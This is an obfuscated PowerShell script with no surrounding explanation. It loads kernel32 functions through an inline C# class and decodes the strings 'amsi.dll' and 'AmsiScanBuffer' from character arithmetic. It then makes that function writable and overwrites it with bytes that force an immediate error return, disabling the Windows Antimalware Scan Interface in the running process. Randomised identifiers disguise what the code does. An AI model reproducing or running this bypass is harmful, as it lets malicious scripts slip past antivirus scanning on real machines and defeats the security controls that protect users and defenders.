$zlSE = @"
using System;
using System.Runtime.InteropServices;
public class zlSE {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lEF27JWjIgecBV, string U6gDLJVaBkI);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr aObCQRvn_N, UIntPtr oqQO3NfAmRczFu, uint KF8AJAdR6KrbawNu, out uint r5evm2U5JtB1xCJP7UK);
}
"@

Add-Type $zlSE

$YFgxuju_vOtdlqrhx = [zlSE]::LoadLibrary("$([CHAr]([bYTe]0x61)+[chAr](15+94)+[CHaR](64+51)+[cHAR](105*44/44)+[CHar](17+29)+[CHAR]([BYTE]0x64)+[cHar](54+54)+[CHAr](108))")
$uAsW = [zlSE]::GetProcAddress($YFgxuju_vOtdlqrhx, "$([cHAR]([bYte]0x41)+[ChaR](109*39/39)+[cHAr]([bYTe]0x73)+[chaR]([bYTe]0x69)+[cHar]([BYTe]0x53)+[chaR](99+43-43)+[ChAr](97+50-50)+[char]([bYtE]0x6e)+[char]([byte]0x42)+[CHaR](117+48-48)+[CHAR](102)+[CHAr](57+45)+[cHar]([BYte]0x65)+[chAr](114))")
$p = 0
[zlSE]::VirtualProtect($uAsW, [uint32]5, 0x40, [ref]$p)
$mI9cntGbd = "0xB8"
$GaHviZO1xPBEXj4 = "0x57"
$RDGM2LvCTJMR4 = "0x00"
$BhFKdt8sZxTqONTATD = "0x07"
$Oqej9A = "0x80"
$cYQM_HhYTW6a5_Q3AiFK = "0xC3"
$hRTuOxklo4nPEjFz = [Byte[]] ($mI9cntGbd,$GaHviZO1xPBEXj4,$RDGM2LvCTJMR4,$BhFKdt8sZxTqONTATD,+$Oqej9A,+$cYQM_HhYTW6a5_Q3AiFK)
[System.Runtime.InteropServices.Marshal]::Copy($hRTuOxklo4nPEjFz, 0, $uAsW, 6)